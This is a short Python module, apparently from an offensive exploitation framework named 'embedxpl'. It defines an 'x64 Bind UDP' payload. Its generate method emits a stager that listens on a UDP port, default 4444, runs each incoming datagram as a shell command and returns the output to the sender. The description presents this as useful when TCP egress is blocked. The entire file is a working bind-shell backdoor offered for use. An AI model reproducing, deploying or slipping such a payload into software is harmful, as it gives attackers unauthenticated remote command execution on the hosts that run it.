"""x64 Bind UDP Shell."""

from embedxpl.core.exploit.payloads import BasePayload


class Payload(BasePayload):
    __info__ = {
        "name": "x64 Bind UDP",
        "description": "UDP bind shell — useful when TCP egress is blocked.",
        "authors": ("André Henrike (@mrhenrike)", "União Geek"),
    }
    options = {
        "LPORT": {"description": "UDP bind port", "required": True, "default": "4444", "value": "4444"},
    }

    def generate(self) -> bytes:
        lport = self.options["LPORT"]["value"]
        stager = f"""import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
s.bind(('',{lport}))
while True:
    data,addr=s.recvfrom(4096)
    if not data:continue
    try:out=subprocess.check_output(data.decode(),shell=True,stderr=subprocess.STDOUT,timeout=10)
    except Exception as e:out=str(e).encode()
    s.sendto(out,addr)
"""
        return stager.encode()
